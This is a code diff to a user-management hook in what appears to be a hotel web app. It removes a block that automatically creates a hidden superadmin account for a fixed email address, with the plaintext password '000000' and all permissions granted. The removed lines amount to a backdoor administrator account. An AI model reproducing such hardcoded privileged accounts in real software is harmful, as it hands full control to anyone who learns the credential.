@@ -174,25 +174,6 @@ export const useUsers = (menuItems: any[]) => {
             const list: UserProfile[] = [];
             snap.forEach(d => list.push({ id: d.id, ...d.data() } as UserProfile));
 
-            // Check for Hardcoded Admin
-            const adminEmail = "nexura.management@gmail.com";
-            const adminExists = list.some(u => u.email === adminEmail);
-            if (!adminExists) {
-                const adminId = adminEmail.toLowerCase().replace(/[@.]/g, '_');
-                const isSuper = true;
-                const adminPerms: Record<string, boolean> = {};
-                ALL_KEYS.forEach(k => {
-                    adminPerms[k] = isSuper;
-                });
-                await setDoc(doc(getHotelCollection(db, "users_master", hotelCode), adminId), {
-                    name: "Setara Management",
-                    email: adminEmail,
-                    password: "000000",
-                    role: "superadmin",
-                    permissions: adminPerms
-                });
-            }
-
             // Proactive Migration: if any user has no permissions map, migrate them in background
             const needsMigration = list.filter(u => !u.permissions);
             if (needsMigration.length > 0) {
